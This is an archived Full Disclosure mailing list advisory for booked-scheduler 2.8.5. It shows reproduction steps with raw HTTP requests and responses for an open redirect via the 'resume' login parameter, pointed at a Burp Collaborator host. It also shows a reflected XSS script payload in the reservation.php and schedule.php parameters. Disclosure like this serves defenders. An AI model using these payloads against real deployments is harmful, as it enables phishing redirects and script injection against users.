---
title: Open Redirect / Reflected XSS - booked-schedulerv2.8.5
url: https://seclists.org/fulldisclosure/2024/Oct/8
source: Full Disclosure
date: 2024-10-30
fetch_date: 2025-10-06T18:56:24.398751
---

# Open Redirect / Reflected XSS - booked-schedulerv2.8.5

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

![](/shared/images/nst-icons.svg#search)

# Open Redirect / Reflected XSS - booked-schedulerv2.8.5

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Mon, 28 Oct 2024 13:11:12 +0000

---

```
# Exploit Title: Open Redirect / Reflected XSS - booked-schedulerv2.8.5
# Date: 10/2024
# Exploit Author: Andrey Stoykov
# Version: 2.8.5
# Tested on: Ubuntu 22.04
# Blog:
https://msecureltd.blogspot.com/2024/10/friday-fun-pentest-series-13-reflected.html
https://msecureltd.blogspot.com/2024/10/friday-fun-pentest-series-12-open.html

Open Redirect:

Steps to Reproduce:

1. Login and intercept HTTP request with a proxy such as Burpsuite or ZAP
2. In the "resume" parameter add the redirect URL e.g. Burp Collab
3. Forward the request

index.php

// HTTP POST login request

POST /Bookedbo8effotfu/Web/index.php HTTP/1.1
Host: localhost
Cookie: PHPSESSID=7c0a0ee0b401863e1a30acbebf301916; language=en_gb;
fus_session=a15fcb9ef40abd1dece4c7fc35c2b58c; fus_visited=yes
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0)
Gecko/20100101 Firefox/132.0
[...]

email=admin&password=password&captcha=&login=submit&resume=
https://urp4vilyopoly8dhq6xa2z8v0m6du3is.oastify.com&language=en_gbg

// HTTP response

HTTP/1.1 302 Found
Date: Sat, 12 Oct 2024 12:09:33 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: https://urp4vilyopoly8dhq6xa2z8v0m6du3is.oastify.com
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8

Reflected XSS:

reservation.php

// HTTP GET request

GET
/Bookedbo8effotfu/Web/reservation.php?rid="><script>alert(document.domain)</script>
HTTP/1.1
Host: localhost
Cookie: PHPSESSID=7c0a0ee0b401863e1a30acbebf301916; language=en_gb;
new_version=v%3D2.8.5%2Cfs%3D1728734988;
fus_session=a15fcb9ef40abd1dece4c7fc35c2b58c; fus_visited=yes
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0)
Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Dnt: 1
Sec-Gpc: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

// HTTP response

HTTP/1.1 200 OK
Date: Sat, 12 Oct 2024 12:23:55 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 14003

<h5><a
href="//localhost/Bookedbo8effotfu/Web/reservation.php?rid="><script>alert(document.domain)</script>">Return
to the last page that you were on</a></h5>
</div>

schedule.php

// HTTP GET request

GET
/Bookedldk0euwfjx/Web/schedule.php?dr="><script>alert(document.domain)</script>
HTTP/1.1
Host: localhost
Cookie: PHPSESSID=c7aa15661bb6b0b72ab88132664b75c9; language=en_gb;
resource_filter1=%7B%22ScheduleId%22%3A%221%22%2C%22ResourceIds%22%3A%5B%5D%2C%22ResourceTypeId%22%3Anull%2C%22MinCapacity%22%3Anull%2C%22ResourceAttributes%22%3A%5B%5D%2C%22ResourceTypeAttributes%22%3A%5B%5D%7D;
schedule_calendar_toggle=false
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0)
Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

// HTTP response

HTTP/1.1 200 OK
Date: Sat, 19 Oct 2024 09:12:33 GMT
Server: Apache
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 7853

<h5><a
href="//localhost/Bookedldk0euwfjx/Web/schedule.php?dr="><script>alert(document.domain)</script>">Return
to the last page that you were on
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](7)
[By Date](date.html#8)
[![Next](/images/right-icon-16x16.png)](9)

[![Previous](/images/left-icon-16x16.png)](7)
[By Thread](index.html#8)
[![Next](/images/right-icon-16x16.png)](9)

### Current thread:

* **Open Redirect / Reflected XSS - booked-schedulerv2.8.5** *Andrey Stoykov (Oct 28)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")